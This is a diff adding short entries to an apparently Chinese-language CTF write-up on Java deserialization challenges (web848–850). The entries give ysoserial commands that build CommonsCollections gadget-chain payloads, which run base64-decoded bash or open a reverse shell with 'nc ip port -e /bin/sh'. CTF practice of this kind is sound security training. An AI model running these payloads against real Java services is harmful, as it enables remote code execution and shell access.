@@ -587,3 +587,32 @@ cc3.2.2
 java7
 `commons-collections 3.1`
 
+```bash
+java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,要执行命令的base64编码}|{base64,-d}|{bash,-i}"|base64 
+```
+
+### web848
+禁用了`TransformeredMap` 类
+
+```bash
+java -jar ysoserial.jar CommonsCollections3 "bash -c {echo,要执行命令的base64编码}|{base64,-d}|{bash,-i}"|base64 
+```
+
+
+### web849
+`commons-collections 4.0`
+cc4,可以使用2或4
+
+```bash
+java -jar ysoserial.jar CommonsCollections2 "nc ip port -e /bin/sh "|base64 
+```
+
+### web850
+
+> commons-collections 3.1的库并对一些可能有危险的类进行了封禁，
+
+cc3
+
+
+
+### web856
